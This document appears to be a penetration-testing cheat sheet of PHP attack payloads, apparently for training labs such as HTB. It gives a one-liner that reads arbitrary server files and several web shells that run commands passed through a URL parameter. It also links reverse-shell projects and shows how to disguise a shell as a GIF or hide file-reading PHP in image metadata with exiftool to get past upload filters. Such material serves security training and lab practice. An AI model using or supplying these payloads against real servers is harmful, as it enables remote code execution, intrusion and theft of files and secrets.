
### Read Files

PHP one liner to read arbitrary files from server file systems:
```PHP
<?php echo file_get_contents('/pat/to/target/file'); ?>
```

Pass system command via query parameters:
```php
<?php echo system($_GET['command']); ?>
```

/////////////////////////////////////////////////////////////////////////////////////////////////////////
### Common Payloads

```php
<?php echo “Hello HTB”;?>
```
```php
<?php echo system('hostname');?>
```

/////////////////////////////////////////////////////////////////////////////////////////////////////////
### Webshells

[https://github.com/Arrexel/phpbash](https://github.com/Arrexel/phpbash)
[https://github.com/pentestmonkey/php-reverse-shell.git](https://github.com/pentestmonkey/php-reverse-shell.git)

Payload that you can append to url    (ie. ?cmd=Command)
```php
<?php system($_GET['cmd']); ?>
```


#### Image upload

Create reverse shell as an image

```cli
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
```


////////////////////////////////////////////////////////////////////////////////////////////////////////
### Crafting Payloads

The following line uses exiftool to smuggle the php code into an image for file upload
```bash
exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" ImageToUse.jpg -o polyglot.php
```